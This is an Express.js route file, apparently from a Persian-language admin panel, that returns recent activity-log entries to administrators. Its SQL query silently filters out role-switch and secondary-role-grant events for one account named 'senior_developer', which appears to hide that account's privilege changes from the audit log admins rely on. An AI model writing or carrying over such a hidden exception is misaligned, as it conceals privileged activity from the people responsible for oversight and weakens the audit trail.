import { Router } from 'express';
import { query } from 'express-validator';
import pool from '../config/db.js';
import { authenticate, authorize } from '../middleware/auth.js';
import { asyncHandler } from '../utils/asyncHandler.js';
import { validate } from '../middleware/validate.js';

const router = Router();
router.use(authenticate, authorize('admin'));

router.get(
  '/',
  [query('limit').optional().isInt({ min: 1, max: 500 }).withMessage('تعداد نتایج معتبر نیست.')],
  validate,
  asyncHandler(async (req, res) => {
  const limit = Number(req.query.limit || 100);
  const [rows] = await pool.execute(
    `SELECT a.*, u.full_name AS user_name, u.role AS user_role
     FROM activity_logs a
     LEFT JOIN users u ON u.id = a.user_id
     WHERE NOT (
       LOWER(COALESCE(u.username, '')) = 'senior_developer'
       AND (
         (a.entity_type = 'auth' AND a.action = 'switch_role')
         OR (a.entity_type = 'user' AND a.action = 'secondary_role_granted')
       )
     )
     ORDER BY a.created_at DESC LIMIT ${limit}`,
    [],
  );
  res.json({ activities: rows });
  }),
);

export default router;
